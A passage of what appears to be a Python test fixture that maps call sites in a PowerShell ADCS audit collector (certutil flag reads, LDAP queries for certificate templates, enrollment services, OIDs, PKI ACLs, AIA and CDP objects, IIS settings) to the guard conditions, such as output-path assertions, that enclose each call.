            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_certutilFlags 'policy\\EditFlags'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_certutilFlags 'CA\\InterfaceFlags'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_certutilRead 'CA\\AuditFilter'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_auditFilterFrom $auditRead.lines $auditRead.code",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_oidValues (_certutilMultiSz 'policy\\DisableExtensionList')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_certutilMultiSz 'policy\\DisableExtensionList'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_certutilDword 'CA\\CAType'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_caKindFromType $caType",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($null -ne $caType) after []",
        ),
    ),
    (
        "hostname",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_rootDse",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_caSecurityRead $name",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "function _localCaRow",
        ),
    ),
    (
        "_list $editFlags",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "function _localCaRow",
        ),
    ),
    (
        "_list $interfaceFlags",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "function _localCaRow",
        ),
    ),
    (
        "_list $disabledExt",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "function _localCaRow",
        ),
    ),
    (
        "_search \"CN=Enrollment Services,$pksDn\" '(objectClass=pKIEnrollmentService)' @('cn', 'dnshostname', 'certificatetemplates', 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'enrollment-services'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'cn'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'dnshostname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'certificatetemplates'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
        ),
    ),
    (
        "ForEach-Object { [string]$_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
        ),
    ),
    (
        "_localCaRow $cn $dns (_guidHex @(_v $p 'objectguid')) $true",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
            "if ($isLocal) after []",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
            "if ($isLocal) after []",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
            "if ($isLocal) after []",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
            "else of [($isLocal)]",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $es.entries)",
            "try",
            "else of [($isLocal)]",
        ),
    ),
    (
        "Where-Object { $_.name -ceq $caCommonName }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if-condition after []",
        ),
    ),
    (
        "_localCaRow $caCommonName $localFqdn '' $false",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($caCommonName -and -not $esFailures -and -not ($caConfig | Where-Object { $_.name -ceq $caCommonName })) after []",
        ),
    ),
    (
        "_markSearch 'ca-config' $caSearch (@($es.entries).Count + $standalone) $caConfig.Count $esFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_markSearch 'enrollment-services' $es @($es.entries).Count $enrollmentServices.Count $esFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_search \"CN=Certificate Templates,$pksDn\" '(objectClass=pKICertificateTemplate)' @( 'cn', 'displayname', 'objectguid', 'mspki-certificate-name-flag', 'mspki-enrollment-flag', 'pkiextendedkeyusage', 'mspki-certificate-policy', 'pkicsp', 'mspki-template-schema-version', 'mspki-cert-template-oid', 'mspki-minimal-key-size', 'ntsecuritydescriptor') -Sd",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'templates'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'mspki-certificate-name-flag'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if-condition after []",
        ),
    ),
    (
        "_v $p 'mspki-certificate-name-flag'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if (@(_v $p 'mspki-certificate-name-flag').Count) after []",
        ),
    ),
    (
        "_v $p 'mspki-enrollment-flag'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if-condition after []",
        ),
    ),
    (
        "_v $p 'mspki-enrollment-flag'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if (@(_v $p 'mspki-enrollment-flag').Count) after []",
        ),
    ),
    (
        "_v $p 'pkicsp'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "ForEach-Object { [string]$_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_sdRead (@(_v $p 'ntsecuritydescriptor')[0])",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'ntsecuritydescriptor'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'cn'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'displayname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'mspki-template-schema-version'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if-condition after []",
        ),
    ),
    (
        "_v $p 'mspki-template-schema-version'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if (@(_v $p 'mspki-template-schema-version').Count) after []",
        ),
    ),
    (
        "_v $p 'mspki-cert-template-oid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'pkiextendedkeyusage'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "ForEach-Object { [string]$_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_decode $nf $NAME_FLAGS",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_decode $ef $ENROLL_FLAGS",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'mspki-minimal-key-size'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if-condition after []",
        ),
    ),
    (
        "_v $p 'mspki-minimal-key-size'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
            "if (@(_v $p 'mspki-minimal-key-size').Count) after []",
        ),
    ),
    (
        "_v $p 'mspki-certificate-policy'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "ForEach-Object { [string]$_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $ts.entries)",
            "try",
        ),
    ),
    (
        "_markSearch 'templates' $ts @($ts.entries).Count $templates.Count $tsFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_search \"CN=OID,$pksDn\" '(objectClass=msPKI-Enterprise-Oid)' @('mspki-cert-template-oid', 'objectguid', 'displayname', 'msds-oidtogrouplink')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'oid-objects'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'msds-oidtogrouplink'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
            "if-condition after []",
        ),
    ),
    (
        "_v $p 'msds-oidtogrouplink'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
            "if (@(_v $p 'msds-oidtogrouplink').Count) after []",
        ),
    ),
    (
        "_v $p 'mspki-cert-template-oid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'displayname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($e in $os.entries)",
            "try",
        ),
    ),
    (
        "_markSearch 'oid-objects' $os @($os.entries).Count $oids.Count $osFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_objAcl $pair[0] $pair[1]",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "foreach ($pair in @( @($pksDn, 'pks_container'), @(\"CN=NTAuthCertificates,$pksDn\", 'ntauth'), @(\"CN=AIA,$pksDn\", 'aia'), @(\"CN=CDP,$pksDn\", 'cdp'), @(\"CN=Certification Authorities,$pksDn\", 'pks_container'), @(\"CN=Enrollment Services,$pksDn\", 'pks_container')))",
        ),
    ),
    (
        "_childAcls \"CN=Certification Authorities,$pksDn\" '(objectClass=certificationAuthority)' 'ca_object'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_childAcls \"CN=Enrollment Services,$pksDn\" '(objectClass=pKIEnrollmentService)' 'ca_object' -CaHost",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_markSearch 'pki-acls' $pkiSearch (6 + $caObjects.returned + $esObjects.returned) $pkiAcls.Count (@($caObjects.failures) + @($esObjects.failures))",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "Join-Path $OutDir 'certs'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
        ),
    ),
    (
        "Assert-AdcsOutputPath $certDir",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
        ),
    ),
    (
        "_search \"CN=AIA,$pksDn\" '(objectClass=certificationAuthority)' @('cn', 'cacertificate')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'certs'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'cn'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'cacertificate'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($blob in @(_v $p 'cacertificate'))",
        ),
    ),
    (
        "_certKindFromDer $der",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($blob in @(_v $p 'cacertificate'))",
        ),
    ),
    (
        "New-Item -ItemType Directory -Force -Path $certDir",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
        ),
    ),
    (
        "Out-Null",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
        ),
    ),
    (
        "_safeFileName $cn",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
        ),
    ),
    (
        "Assert-AdcsOutputPath (Join-Path $certDir $certFile)",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
        ),
    ),
    (
        "Join-Path $certDir $certFile",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
        ),
    ),
    (
        "Join-Path $certDir $certFile",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $certFile)",
        ),
    ),
    (
        "_search \"CN=CDP,$pksDn\" '(objectClass=cRLDistributionPoint)' @('cn', 'certificaterevocationlist', 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'crls'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'cn'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'certificaterevocationlist'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "if-condition after []",
        ),
    ),
    (
        "_v $p 'certificaterevocationlist'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
        ),
    ),
    (
        "New-Item -ItemType Directory -Force -Path $certDir",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
        ),
    ),
    (
        "Out-Null",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
        ),
    ),
    (
        "_safeFileName $cn",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
        ),
    ),
    (
        "Assert-AdcsOutputPath (Join-Path $certDir $crlFile)",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
        ),
    ),
    (
        "Join-Path $certDir $crlFile",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
        ),
    ),
    (
        "Join-Path $certDir $crlFile",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $crlFile)",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $crlFile)",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $crlFile)",
        ),
    ),
    (
        "_v $p 'distinguishedname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $crlFile)",
        ),
    ),
    (
        "_markSearch 'certs' $aia @($aia.entries).Count $aiaObjects $aiaFailures $certIndex.Count",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
        ),
    ),
    (
        "_markSearch 'crls' $cdp @($cdp.entries).Count $cdpObjects $cdpFailures $crlIndex.Count",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
        ),
    ),
    (
        'Write-Warning "certs pass failed: $($_.Exception.Message)"',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "catch []",
        ),
    ),
    (
        "Import-Module WebAdministration -ErrorAction Stop",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
        ),
    ),
    (
        "Get-Website -ErrorAction Stop",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
        ),
    ),
    (
        "Get-WebApplication -Site $site.Name -ErrorAction Stop",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
        ),
    ),
    (
        "_classifyApp $appPath",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
        ),
    ),
    (
        "_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name enabled -ErrorAction Stop }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
